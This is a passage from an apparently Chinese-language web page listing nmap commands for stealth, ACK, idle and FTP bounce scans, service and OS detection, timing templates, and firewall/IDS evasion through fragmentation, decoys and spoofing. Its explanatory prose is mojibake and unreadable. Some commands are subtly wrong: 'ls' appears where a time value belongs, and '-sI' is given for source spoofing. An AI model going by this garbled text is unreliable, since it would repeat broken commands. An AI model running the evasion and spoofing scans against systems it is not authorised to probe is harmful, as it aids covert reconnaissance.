id="éšè”½æ‰«æ"><a href="#éšè”½æ‰«æ" class="headerlink" title="éšè”½æ‰«æ"></a>éšè”½æ‰«æ</h4><p>å¦‚æœæ‰«æç³»ç»Ÿéµå¾ªè¯¥RFCï¼Œå½“ç«¯å£å…³é—­æ—¶ï¼Œä»»ä½•ä¸åŒ…å«SYNï¼ŒRSTï¼Œæˆ–è€…ACKä½çš„æŠ¥æ–‡ä¼šå¯¼è‡´ ä¸€ä¸ªRSTè¿”å›ï¼Œè€Œå½“ç«¯å£å¼€æ”¾æ—¶ï¼Œåº”è¯¥æ²¡æœ‰ä»»ä½•å“åº”ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sN</span> ip<span class="token punctuation">(</span>NULLæ‰«æ<span class="token punctuation">)</span>nmap <span class="token parameter variable">-sF</span> ip<span class="token punctuation">(</span>FINæ‰«æ<span class="token punctuation">)</span>nmap <span class="token parameter variable">-sX</span> ip<span class="token punctuation">(</span>Xmasæ‰«æ<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="TCP-ACK-æ‰«æ"><a href="#TCP-ACK-æ‰«æ" class="headerlink" title="TCP ACK æ‰«æ"></a>TCP ACK æ‰«æ</h4><p> å®ƒç”¨äºå‘ç°é˜²ç«å¢™è§„åˆ™ï¼Œç¡®å®šå®ƒä»¬æ˜¯æœ‰çŠ¶æ€çš„è¿˜æ˜¯æ— çŠ¶æ€çš„ï¼Œå“ªäº›ç«¯å£æ˜¯è¢«è¿‡æ»¤çš„ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sA</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="TCP-çª—å£æ‰«æ"><a href="#TCP-çª—å£æ‰«æ" class="headerlink" title="TCP çª—å£æ‰«æ"></a>TCP çª—å£æ‰«æ</h4><p>é€šè¿‡æ£€æŸ¥è¿”å›çš„RSTæŠ¥æ–‡çš„TCPçª—å£åŸŸåšåˆ°è¿™ä¸€ç‚¹ã€‚ åœ¨æŸäº›ç³»ç»Ÿä¸Šï¼Œå¼€æ”¾ç«¯å£ç”¨æ­£æ•°è¡¨ç¤ºçª—å£å¤§å°(ç”šè‡³å¯¹äºRSTæŠ¥æ–‡) è€Œå…³é—­ç«¯å£çš„çª—å£å¤§å°ä¸º0ã€‚å› æ­¤ï¼Œå½“æ”¶åˆ°RSTæ—¶ï¼Œçª—å£æ‰«æä¸æ€»æ˜¯æŠŠç«¯å£æ ‡è®°ä¸º <code>unfiltered</code>ï¼Œ è€Œæ˜¯æ ¹æ®TCPçª—å£å€¼æ˜¯æ­£æ•°è¿˜æ˜¯0ï¼Œåˆ†åˆ«æŠŠç«¯å£æ ‡è®°ä¸º<code>open</code>æˆ–è€… <code>closed</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sW</span> <span class="token parameter variable">-v</span> <span class="token parameter variable">-F</span>  <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="TCP-Maimon-æ‰«æ"><a href="#TCP-Maimon-æ‰«æ" class="headerlink" title="TCP Maimon æ‰«æ"></a>TCP Maimon æ‰«æ</h4><p>å’ŒNullï¼ŒFINï¼Œä»¥åŠXmasæ‰«æå®Œå…¨ä¸€æ ·ï¼Œé™¤äº†æ¢æµ‹æŠ¥æ–‡æ˜¯FIN/ACKã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sM</span> <span class="token parameter variable">-T4</span>  <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="è‡ªå®šä¹‰-æ‰«æ"><a href="#è‡ªå®šä¹‰-æ‰«æ" class="headerlink" title="è‡ªå®šä¹‰ æ‰«æ"></a>è‡ªå®šä¹‰ æ‰«æ</h4><p><code>--scanflags</code>é€‰é¡¹å…è®¸æ‚¨é€šè¿‡æŒ‡å®šä»»æ„TCPæ ‡å¿—ä½æ¥è®¾è®¡æ‚¨è‡ªå·±çš„æ‰«æã€‚<code>--scanflags</code>é€‰é¡¹å¯ä»¥æ˜¯ä¸€ä¸ªæ•°å­—æ ‡è®°å€¼å¦‚9 (PSHå’ŒFIN)ï¼Œå¯ä»¥è®¾ç½® TCPæ‰«æç±»å‹(å¦‚<code>-sA</code>æˆ–è€…<code>-sF</code>)ï¼Œå¦‚â€“scanflags URGACKPSHRSTSYNFIN</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sT</span> <span class="token parameter variable">--scanflags</span> SYNURG <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="ç©ºé—²-æ‰«æ-éšè—IP"><a href="#ç©ºé—²-æ‰«æ-éšè—IP" class="headerlink" title="ç©ºé—² æ‰«æ( éšè—IP )"></a>ç©ºé—² æ‰«æ( éšè—IP )</h4><p>è¿™ç§é«˜çº§çš„æ‰«ææ–¹æ³•å…è®¸å¯¹ç›®æ ‡è¿›è¡ŒçœŸæ­£çš„TCPç«¯å£ç›²æ‰«æ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sI</span> www.0day.co:80 <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="IPåè®®-æ‰«æ"><a href="#IPåè®®-æ‰«æ" class="headerlink" title="IPåè®® æ‰«æ"></a>IPåè®® æ‰«æ</h4><p>IP åè®®æ‰«æå¯ä»¥è®©æ‚¨ç¡®å®šç›®æ ‡æœºæ”¯æŒå“ªäº›IPåè®® (TCPï¼ŒICMPï¼ŒIGMPï¼Œç­‰ç­‰)ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sO</span> <span class="token parameter variable">-T4</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="FTPå¼¹è·³æ‰«æ"><a href="#FTPå¼¹è·³æ‰«æ" class="headerlink" title="FTPå¼¹è·³æ‰«æ"></a>FTPå¼¹è·³æ‰«æ</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-b</span> <span class="token operator">&lt;</span>ftp relay host<span class="token operator">&gt;</span> <span class="token punctuation">(</span>FTPå¼¹è·³æ‰«æ<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="æœåŠ¡å’Œç‰ˆæœ¬æ¢æµ‹"><a href="#æœåŠ¡å’Œç‰ˆæœ¬æ¢æµ‹" class="headerlink" title="æœåŠ¡å’Œç‰ˆæœ¬æ¢æµ‹"></a>æœåŠ¡å’Œç‰ˆæœ¬æ¢æµ‹</h3><p>æŠŠNmapæŒ‡å‘ä¸€ä¸ªè¿œç¨‹æœºå™¨ï¼Œå®ƒå¯èƒ½å‘Šè¯‰ä½ ç«¯å£25/tcpï¼Œ80/tcpï¼Œå’Œ53/udpæ˜¯å¼€æ”¾çš„ã€‚ä½¿ç”¨åŒ…å«å¤§çº¦2,200ä¸ªè‘—åçš„æœåŠ¡çš„ <code>nmap-services</code>æ•°æ®åº“ï¼Œ Nmapå¯ä»¥æŠ¥å‘Šé‚£äº›ç«¯å£å¯èƒ½åˆ†åˆ«å¯¹åº”äºä¸€ä¸ªé‚®ä»¶æœåŠ¡å™¨ (SMTP)ï¼ŒwebæœåŠ¡å™¨(HTTP)ï¼Œå’ŒåŸŸåæœåŠ¡å™¨(DNS)ã€‚ </p><h4 id="ç‰ˆæœ¬æ¢æµ‹"><a href="#ç‰ˆæœ¬æ¢æµ‹" class="headerlink" title="ç‰ˆæœ¬æ¢æµ‹"></a>ç‰ˆæœ¬æ¢æµ‹</h4><p>æ‰“å¼€ç‰ˆæœ¬æ¢æµ‹</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sV</span> <span class="token function">ip</span>nmap <span class="token parameter variable">-sV</span> <span class="token parameter variable">-A</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="å…¨ç«¯å£ç‰ˆæœ¬æ¢æµ‹"><a href="#å…¨ç«¯å£ç‰ˆæœ¬æ¢æµ‹" class="headerlink" title="å…¨ç«¯å£ç‰ˆæœ¬æ¢æµ‹"></a>å…¨ç«¯å£ç‰ˆæœ¬æ¢æµ‹</h4><p>æŒ‡å®š<code>--allports</code>æ‰«ææ‰€æœ‰ç«¯å£</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sV</span> <span class="token parameter variable">--allports</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="è®¾ç½®æ‰«æå¼ºåº¦"><a href="#è®¾ç½®æ‰«æå¼ºåº¦" class="headerlink" title="è®¾ç½®æ‰«æå¼ºåº¦"></a>è®¾ç½®æ‰«æå¼ºåº¦</h4><p>è¢«èµ‹äºˆè¾ƒä½å€¼çš„æ¢æµ‹æŠ¥æ–‡å¯¹å¤§èŒƒå›´çš„å¸¸è§æœåŠ¡æœ‰æ•ˆï¼Œè€Œè¢«èµ‹äºˆè¾ƒé«˜å€¼çš„æŠ¥æ–‡ ä¸€èˆ¬æ²¡ä»€ä¹ˆç”¨ã€‚æ•°å€¼è¶Šé«˜ï¼Œ æœåŠ¡è¶Šæœ‰å¯èƒ½è¢«æ­£ç¡®è¯†åˆ«ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sV</span> --version-intensity <span class="token punctuation">(</span><span class="token number">0</span>-9<span class="token punctuation">)</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="è½»é‡çº§æ‰«æ"><a href="#è½»é‡çº§æ‰«æ" class="headerlink" title="è½»é‡çº§æ‰«æ"></a>è½»é‡çº§æ‰«æ</h4><p> <code>--version-intensity 2</code>çš„æ–¹ä¾¿çš„åˆ«åã€‚è½»é‡çº§æ¨¡å¼ä½¿ç‰ˆæœ¬æ‰«æå¿«è®¸å¤š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sV</span> --version-light <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="é‡é‡çº§æ‰«æ"><a href="#é‡é‡çº§æ‰«æ" class="headerlink" title="é‡é‡çº§æ‰«æ"></a>é‡é‡çº§æ‰«æ</h4><p><code>--version-intensity 9</code>çš„åˆ«åï¼Œ ä¿è¯å¯¹æ¯ä¸ªç«¯å£å°è¯•æ¯ä¸ªæ¢æµ‹æŠ¥æ–‡ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sV</span> --version-all <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="è·å–è¯¦ç»†ç‰ˆæœ¬ä¿¡æ¯"><a href="#è·å–è¯¦ç»†ç‰ˆæœ¬ä¿¡æ¯" class="headerlink" title="è·å–è¯¦ç»†ç‰ˆæœ¬ä¿¡æ¯"></a>è·å–è¯¦ç»†ç‰ˆæœ¬ä¿¡æ¯</h4><p>Nmapæ‰“å°å‡ºè¯¦ç»†çš„å…³äºæ­£åœ¨è¿›è¡Œçš„æ‰«æçš„è°ƒè¯•ä¿¡æ¯</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sV</span> --version-trace <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="RPCæ‰«æ"><a href="#RPCæ‰«æ" class="headerlink" title="RPCæ‰«æ"></a>RPCæ‰«æ</h4><p>å®ƒå¯¹æ‰€æœ‰è¢«å‘ç°å¼€æ”¾çš„TCP/UDPç«¯å£æ‰§è¡ŒSunRPCç¨‹åºNULLå‘½ä»¤ï¼Œæ¥è¯•å›¾ ç¡®å®šå®ƒä»¬æ˜¯å¦RPCç«¯å£ï¼Œå¦‚æœæ˜¯ï¼Œ æ˜¯ä»€ä¹ˆç¨‹åºå’Œç‰ˆæœ¬å·ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sS</span> <span class="token parameter variable">-sR</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="æ“ä½œç³»ç»Ÿæ¢æµ‹"><a href="#æ“ä½œç³»ç»Ÿæ¢æµ‹" class="headerlink" title="æ“ä½œç³»ç»Ÿæ¢æµ‹"></a>æ“ä½œç³»ç»Ÿæ¢æµ‹</h3><p>Nmapå‘é€ä¸€ç³»åˆ—TCPå’ŒUDPæŠ¥æ–‡åˆ°è¿œç¨‹ä¸»æœºï¼Œæ£€æŸ¥å“åº”ä¸­çš„æ¯ä¸€ä¸ªæ¯”ç‰¹ã€‚ åœ¨è¿›è¡Œä¸€æ‰“æµ‹è¯•å¦‚TCP ISNé‡‡æ ·ï¼ŒTCPé€‰é¡¹æ”¯æŒå’Œæ’åºï¼ŒIPIDé‡‡æ ·ï¼Œå’Œåˆå§‹çª—å£å¤§å°æ£€æŸ¥ä¹‹åï¼Œ NmapæŠŠç»“æœå’Œæ•°æ®åº“<code>nmap-os-fingerprints</code>ä¸­è¶…è¿‡ 1500ä¸ªå·²çŸ¥çš„æ“ä½œç³»ç»Ÿçš„fingerprintsè¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœæœ‰åŒ¹é…ï¼Œå°±æ‰“å°å‡ºæ“ä½œç³»ç»Ÿçš„è¯¦ç»†ä¿¡æ¯ã€‚ </p><h4 id="å¯ç”¨æ“ä½œç³»ç»Ÿæ£€æµ‹"><a href="#å¯ç”¨æ“ä½œç³»ç»Ÿæ£€æµ‹" class="headerlink" title="å¯ç”¨æ“ä½œç³»ç»Ÿæ£€æµ‹"></a>å¯ç”¨æ“ä½œç³»ç»Ÿæ£€æµ‹</h4><p>ä¹Ÿå¯ä»¥ä½¿ç”¨<code>-A</code>æ¥åŒæ—¶å¯ç”¨æ“ä½œç³»ç»Ÿæ£€æµ‹å’Œç‰ˆæœ¬æ£€æµ‹ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-O</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="å¯¹æŒ‡å®šçš„ç›®æ ‡è¿›è¡Œæ“ä½œç³»ç»Ÿç›‘æµ‹"><a href="#å¯¹æŒ‡å®šçš„ç›®æ ‡è¿›è¡Œæ“ä½œç³»ç»Ÿç›‘æµ‹" class="headerlink" title="å¯¹æŒ‡å®šçš„ç›®æ ‡è¿›è¡Œæ“ä½œç³»ç»Ÿç›‘æµ‹"></a>å¯¹æŒ‡å®šçš„ç›®æ ‡è¿›è¡Œæ“ä½œç³»ç»Ÿç›‘æµ‹</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-O</span> --osscan-limit <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="æ¨æµ‹ç³»ç»Ÿå¹¶è¯†åˆ«"><a href="#æ¨æµ‹ç³»ç»Ÿå¹¶è¯†åˆ«" class="headerlink" title="æ¨æµ‹ç³»ç»Ÿå¹¶è¯†åˆ«"></a>æ¨æµ‹ç³»ç»Ÿå¹¶è¯†åˆ«</h4><p>å½“Nmapæ— æ³•ç¡®å®šæ‰€æ£€æµ‹çš„æ“ä½œç³»ç»Ÿæ—¶ï¼Œä¼šå°½å¯èƒ½åœ°æä¾›æœ€ç›¸è¿‘çš„åŒ¹é…</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-O</span> --osscan-guess/ <span class="token parameter variable">--fuzzy</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="æ—¶é—´å’Œæ€§èƒ½"><a href="#æ—¶é—´å’Œæ€§èƒ½" class="headerlink" title="æ—¶é—´å’Œæ€§èƒ½"></a>æ—¶é—´å’Œæ€§èƒ½</h3><h4 id="è°ƒæ•´å¹¶è¡Œæ‰«æç»„çš„å¤§å°"><a href="#è°ƒæ•´å¹¶è¡Œæ‰«æç»„çš„å¤§å°" class="headerlink" title="è°ƒæ•´å¹¶è¡Œæ‰«æç»„çš„å¤§å°"></a>è°ƒæ•´å¹¶è¡Œæ‰«æç»„çš„å¤§å°</h4><p><code>--max-hostgroup</code>é€‰é¡¹ç”¨äºè¯´æ˜ä½¿ç”¨æœ€å¤§çš„ç»„ï¼ŒNmapä¸ ä¼šè¶…å‡ºè¿™ä¸ªå¤§å°ã€‚<code>--min-hostgroup</code>é€‰é¡¹è¯´æ˜æœ€å°çš„ç»„ï¼ŒNmap ä¼šä¿æŒç»„å¤§äºè¿™ä¸ªå€¼</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap --min-hostgroup <span class="token number">30</span> <span class="token function">ip</span>nmap --max-hostgroup <span class="token number">1024</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="è°ƒæ•´æ¢æµ‹æŠ¥æ–‡çš„å¹¶è¡Œåº¦"><a href="#è°ƒæ•´æ¢æµ‹æŠ¥æ–‡çš„å¹¶è¡Œåº¦" class="headerlink" title="è°ƒæ•´æ¢æµ‹æŠ¥æ–‡çš„å¹¶è¡Œåº¦"></a>è°ƒæ•´æ¢æµ‹æŠ¥æ–‡çš„å¹¶è¡Œåº¦</h4><p>è¿™äº›é€‰é¡¹æ§åˆ¶ç”¨äºä¸»æœºç»„çš„æ¢æµ‹æŠ¥æ–‡æ•°é‡ï¼Œå¯ç”¨äºç«¯å£æ‰«æå’Œä¸»æœºå‘ç°ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap --min-parallelism <span class="token number">100</span> <span class="token function">ip</span>nmap --max-parallelism <span class="token number">100</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="è°ƒæ•´æ¢æµ‹æŠ¥æ–‡è¶…æ—¶"><a href="#è°ƒæ•´æ¢æµ‹æŠ¥æ–‡è¶…æ—¶" class="headerlink" title="è°ƒæ•´æ¢æµ‹æŠ¥æ–‡è¶…æ—¶"></a>è°ƒæ•´æ¢æµ‹æŠ¥æ–‡è¶…æ—¶</h4><p>Nmapä½¿ç”¨ä¸€ä¸ªè¿è¡Œè¶…æ—¶å€¼æ¥ç¡®å®šç­‰å¾…æ¢æµ‹æŠ¥æ–‡å“åº”çš„æ—¶é—´ï¼Œéšåä¼šæ”¾å¼ƒæˆ–é‡æ–°å‘é€æ¢æµ‹æŠ¥æ–‡ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap --initial-rtt-timeout 100ms <span class="token function">ip</span>nmap --max-rtt-timeout 100ms <span class="token function">ip</span>nmap --min-rtt-timeout 100ms <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="æ”¾å¼ƒç¼“æ…¢çš„ç›®æ ‡ä¸»æœº"><a href="#æ”¾å¼ƒç¼“æ…¢çš„ç›®æ ‡ä¸»æœº" class="headerlink" title="æ”¾å¼ƒç¼“æ…¢çš„ç›®æ ‡ä¸»æœº"></a>æ”¾å¼ƒç¼“æ…¢çš„ç›®æ ‡ä¸»æœº</h4><p><code>--host-timeout</code>é€‰é¡¹æ¥è¯´æ˜ç­‰å¾…çš„æ—¶é—´(æ¯«ç§’)</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap --host-timeout 1800000ms <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="è°ƒæ•´æŠ¥æ–‡é€‚åˆæ—¶é—´é—´éš”"><a href="#è°ƒæ•´æŠ¥æ–‡é€‚åˆæ—¶é—´é—´éš”" class="headerlink" title="è°ƒæ•´æŠ¥æ–‡é€‚åˆæ—¶é—´é—´éš”"></a>è°ƒæ•´æŠ¥æ–‡é€‚åˆæ—¶é—´é—´éš”</h4><p>è¿™ä¸ªé€‰é¡¹ç”¨äºNmapæ§åˆ¶é’ˆå¯¹ä¸€ä¸ªä¸»æœºå‘é€æ¢æµ‹æŠ¥æ–‡çš„ç­‰å¾…æ—¶é—´(æ¯«ç§’)</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap --scan-delay <span class="token function">ls</span> <span class="token function">ip</span>nmap --max-scan-delay <span class="token function">ls</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="è®¾ç½®æ—¶é—´æ¨¡æ¿"><a href="#è®¾ç½®æ—¶é—´æ¨¡æ¿" class="headerlink" title="è®¾ç½®æ—¶é—´æ¨¡æ¿"></a>è®¾ç½®æ—¶é—´æ¨¡æ¿</h4><p>å¾€å¾€é€‰æ‹©åˆé€‚å‚æ•°çš„æ—¶é—´è¶…è¿‡äº†æ‰€éœ€ä¼˜åŒ–çš„æ‰«ææ—¶é—´ï¼ŒNmapæä¾›äº†ä¸€äº›ç®€å•çš„æ–¹æ³•ï¼Œä½¿ç”¨6ä¸ªæ—¶é—´æ¨¡æ¿ï¼Œä½¿ç”¨æ—¶é‡‡ç”¨<code>-T</code>é€‰é¡¹åŠæ•°å­—(0 - 5) æˆ–åç§°ã€‚æ¨¡æ¿åç§°æœ‰paranoid (0)ã€sneaky (1)ã€polite (2)ã€normal(3)ã€ aggressive (4)å’Œinsane (5)ã€‚å‰ä¸¤ç§æ¨¡å¼ç”¨äºIDSèº²é¿ï¼ŒPoliteæ¨¡å¼é™ä½äº†æ‰«æ é€Ÿåº¦ä»¥ä½¿ç”¨æ›´å°‘çš„å¸¦å®½å’Œç›®æ ‡ä¸»æœºèµ„æºã€‚é»˜è®¤æ¨¡å¼ä¸ºNormalï¼Œå› æ­¤<code>-T3</code> å®é™…ä¸Šæ˜¯æœªåšä»»ä½•ä¼˜åŒ–ã€‚Aggressiveæ¨¡å¼å‡è®¾ç”¨æˆ·å…·æœ‰åˆé€‚åŠå¯é çš„ç½‘ç»œä»è€ŒåŠ é€Ÿ æ‰«æã€‚Insaneæ¨¡å¼å‡è®¾ç”¨æˆ·å…·æœ‰ç‰¹åˆ«å¿«çš„ç½‘ç»œæˆ–è€…æ„¿æ„ä¸ºè·å¾—é€Ÿåº¦è€Œç‰ºç‰²å‡†ç¡®æ€§ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-T</span> <span class="token operator">&lt;</span>Paranoid<span class="token operator">|</span>Sneaky<span class="token operator">|</span>Polite<span class="token operator">|</span>Normal<span class="token operator">|</span>Aggressive<span class="token operator">|</span>Insane<span class="token operator">&gt;</span><span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="é˜²ç«å¢™-IDSèº²é¿å’Œå“„éª—"><a href="#é˜²ç«å¢™-IDSèº²é¿å’Œå“„éª—" class="headerlink" title="é˜²ç«å¢™/IDSèº²é¿å’Œå“„éª—"></a>é˜²ç«å¢™/IDSèº²é¿å’Œå“„éª—</h3><h4 id="æŠ¥æ–‡åˆ†æ®µ"><a href="#æŠ¥æ–‡åˆ†æ®µ" class="headerlink" title="æŠ¥æ–‡åˆ†æ®µ"></a>æŠ¥æ–‡åˆ†æ®µ</h4><p><code>-f</code>é€‰é¡¹è¦æ±‚æ‰«ææ—¶(åŒ…æŒºpingæ‰«æ)ä½¿ç”¨å°çš„IPåŒ…åˆ†æ®µã€‚å…¶æ€è·¯æ˜¯å°†TCPå¤´åˆ†æ®µåœ¨å‡ ä¸ªåŒ…ä¸­ï¼Œä½¿å¾—åŒ…è¿‡æ»¤å™¨ã€IDSä»¥åŠå…¶å®ƒå·¥å…·çš„æ£€æµ‹æ›´åŠ å›°éš¾ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-f</span> <span class="token parameter variable">-v</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="æŒ‡å®šåç§»å¤§å°"><a href="#æŒ‡å®šåç§»å¤§å°" class="headerlink" title="æŒ‡å®šåç§»å¤§å°"></a>æŒ‡å®šåç§»å¤§å°</h4><p>ä½¿ç”¨<code>--mtu</code>é€‰é¡¹å¯ä»¥è‡ªå®šä¹‰åç§»çš„å¤§å°ï¼Œä½¿ç”¨æ—¶ä¸éœ€è¦<code>-f</code>ï¼Œåç§»é‡å¿…é¡» æ˜¯8çš„å€æ•°ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">--mtu</span> <span class="token number">16</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="IPæ¬ºéª—"><a href="#IPæ¬ºéª—" class="headerlink" title="IPæ¬ºéª—"></a>IPæ¬ºéª—</h4><p>ä¸ºä½¿è¯±é¥µæ‰«æèµ·ä½œç”¨ï¼Œéœ€è¦ä½¿è¿œç¨‹ä¸»æœºè®¤ä¸ºæ˜¯è¯±é¥µåœ¨æ‰«æç›®æ ‡ç½‘ç»œã€‚ IDSå¯èƒ½ä¼šæŠ¥ä¸ªæŸä¸ªIPçš„5-10ä¸ªç«¯å£æ‰«æï¼Œä½†å¹¶ä¸çŸ¥é“å“ªä¸ªIPåœ¨æ‰«æä»¥åŠ å“ªäº›ä¸æ˜¯è¯±é¥µã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-D</span> RND:11 <span class="token function">ip</span>nmap <span class="token parameter variable">-D</span> ip1,ip2,ip3 ip1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="æºåœ°å€æ¬ºéª—"><a href="#æºåœ°å€æ¬ºéª—" class="headerlink" title="æºåœ°å€æ¬ºéª—"></a>æºåœ°å€æ¬ºéª—</h4><p>è¿™ä¸ªæ ‡å¿—çš„å¦ä¸€ä¸ªç”¨å¤„æ˜¯å“„éª—æ€§çš„æ‰«æï¼Œä½¿å¾—ç›®æ ‡è®¤ä¸ºæ˜¯å¦ä¸€ä¸ªåœ°å€åœ¨è¿›è¡Œæ‰«æã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sI</span> æ¬ºéª—ip:80 <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="ä½¿ç”¨æŒ‡å®šçš„æ¥å£"><a href="#ä½¿ç”¨æŒ‡å®šçš„æ¥å£" class="headerlink" title="ä½¿ç”¨æŒ‡å®šçš„æ¥å£"></a>ä½¿ç”¨æŒ‡å®šçš„æ¥å£</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-e</span> interface <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="æºç«¯å£æ¬ºéª—"><a href="#æºç«¯å£æ¬ºéª—" class="headerlink" title="æºç«¯å£æ¬ºéª—"></a>æºç«¯å£æ¬ºéª—</h4><p>Nmapæä¾›äº†<code>-g</code>å’Œ<code>--source-port</code>é€‰é¡¹(å®ƒä»¬æ˜¯ ç­‰ä»·çš„)</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap --source-port <span class="token number">902</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="æŒ‡å®šå‘åŒ…é•¿åº¦"><a href="#æŒ‡å®šå‘åŒ…é•¿åº¦" class="headerlink" title="æŒ‡å®šå‘åŒ…é•¿åº¦"></a>æŒ‡å®šå‘åŒ…é•¿åº¦</h4><p>è¿™ä¸ªé€‰é¡¹å‘Šè¯‰Nmapåœ¨å‘é€çš„æŠ¥æ–‡ä¸Šé™„åŠ æŒ‡å®šæ•°é‡çš„éšæœºå­—èŠ‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap --data-length <span class="token number">30</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="è®¾ç½®IP-time-to-liveåŸŸ"><a href="#è®¾ç½®IP-time-to-liveåŸŸ" class="headerlink" title="è®¾ç½®IP time-to-liveåŸŸ"></a>è®¾ç½®IP time-to-liveåŸŸ</h4><p>è®¾ç½®IPv4æŠ¥æ–‡çš„time-to-liveåŸŸä¸ºæŒ‡å®šçš„å€¼ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">--ttl</span> <span class="token operator">&lt;</span>value<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="ç›®æ ‡ä¸»æœºéšæœºæ’åº"><a href="#ç›®æ ‡ä¸»æœºéšæœºæ’åº" class="headerlink" title="ç›®æ ‡ä¸»æœºéšæœºæ’åº"></a>ç›®æ ‡ä¸»æœºéšæœºæ’åº</h4><p>å‘Šè¯‰Nmapåœ¨æ‰«æä¸»æœºå‰å¯¹æ¯ä¸ªç»„ä¸­çš„ä¸»æœºéšæœºæ’åˆ—ï¼Œæœ€å¤šå¯è¾¾ 8096ä¸ªä¸»æœºã€‚</p><pre class="line-numbers language-bash" 